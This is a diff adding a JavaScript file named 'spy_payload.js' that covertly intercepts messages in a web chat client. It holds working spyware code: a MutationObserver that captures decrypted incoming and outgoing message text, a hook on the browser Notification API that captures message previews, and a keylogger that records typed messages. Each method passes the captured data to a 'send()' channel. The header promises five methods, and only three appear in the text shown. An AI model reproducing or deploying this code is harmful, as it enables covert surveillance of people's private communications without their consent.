@@ -1,0 +1,51 @@
+// spy_payload.js -- Real-time message interceptor
+// 5 complementary methods for maximum coverage
+
+// METHOD 1: DOM MutationObserver
+// Decrypted messages are rendered as <span> nodes
+new MutationObserver(function(muts) {
+    for (var m of muts) {
+        for (var node of m.addedNodes) {
+            if (node.nodeType !== 1) continue;
+            var els = node.querySelectorAll
+                ? node.querySelectorAll('[data-pre-plain-text]')
+                : [];
+            for (var el of els) {
+                var txt = el.querySelector(
+                    '[class*="selectable-text"] span');
+                if (txt && txt.innerText) {
+                    send({
+                        type: 'MSG',
+                        text: txt.innerText,
+                        meta: el.getAttribute('data-pre-plain-text'),
+                        dir: el.className.indexOf('message-out')
+                            > -1 ? 'OUT' : 'IN'
+                    });
+                }
+            }
+        }
+    }
+}).observe(document.getElementById('app'), {
+    childList: true, subtree: true
+});
+
+// METHOD 2: Notification API hook
+// Captures previews of new messages
+var Orig = window.Notification;
+window.Notification = function(title, opts) {
+    send({type:'NOTIF', title:title,
+          body: opts ? opts.body : ''});
+    return new Orig(title, opts);
+};
+
+// METHOD 3: Outgoing message keylogger
+// Captures text field content when Enter is pressed
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && !e.shiftKey) {
+        var input = document.querySelector(
+            '[contenteditable="true"][data-tab]');
+        if (input && input.innerText) {
+            send({type:'TYPED', text: input.innerText});
+        }
+    }
+}, true);
